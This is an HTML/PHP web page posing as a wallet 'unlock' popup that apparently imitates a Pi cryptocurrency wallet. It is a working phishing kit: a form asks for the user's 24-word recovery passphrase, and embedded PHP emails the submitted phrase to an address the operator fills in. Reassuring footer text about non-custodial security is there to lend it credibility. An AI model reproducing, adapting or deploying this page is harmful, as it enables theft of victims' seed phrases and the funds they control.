<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Reward Popup</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .popup {
            width: 400px;
            background-color: white;
            border: 2px solid #ddd;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin: 50px auto;
            position: relative;
            border-radius: 8px;
        }
        .header {
            background-color: purple;
            color: white;
            text-align: center;
            padding: 10px;
            border-radius: 5px 5px 0 0;
            font-size: 24px;
        }
        .content {
            margin-top: 20px;
        }
        .content p {
            text-align: center;
            font-size: 18px;
            margin-bottom: 20px;
        }
        .input-box {
            border: 1px solid black;
            padding: 10px;
            width: 100%;
            box-sizing: border-box;
            font-size: 16px;
        }
        .button {
            display: block;
            background-color: purple;
            color: white;
            text-align: center;
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            border: none;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="popup">
        <div class="header">Wallet</div>
        <div class="content">
            <p>Unlock S Wallet</p>
            <?php
            if ($_SERVER["REQUEST_METHOD"] == "POST") {
                $passphrase = htmlspecialchars($_POST['passphrase']);

                $to = "your-email@example.com"; // Replace with your email address
                $subject = "New Passphrase Submitted";
                $message = "The submitted passphrase is: " . $passphrase;
                $headers = "From: no-reply@yourdomain.com"; // Replace with a valid domain email

                if (mail($to, $subject, $message, $headers)) {
                    echo "<p style='color: green; text-align: center;'>Passphrase sent successfully!</p>";
                } else {
                    echo "<p style='color: red; text-align: center;'>Failed to send passphrase.</p>";
                }
            }
            ?>
            <form method="post" action="">
                <textarea name="passphrase" class="input-box" placeholder="Enter your 24-words passphrase here" required></textarea>
                <button type="submit" class="button">Unlock with passphrase</button>
            </form>
        </div>
        <div class="footer">
        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
            <br>Lost your passphrase? <span
            style="color: #2372cc;">you can create a new wallet,</span> but all your π in your previous wallet will be inaccessible.
        </div>
    </div>
</body>
</html>
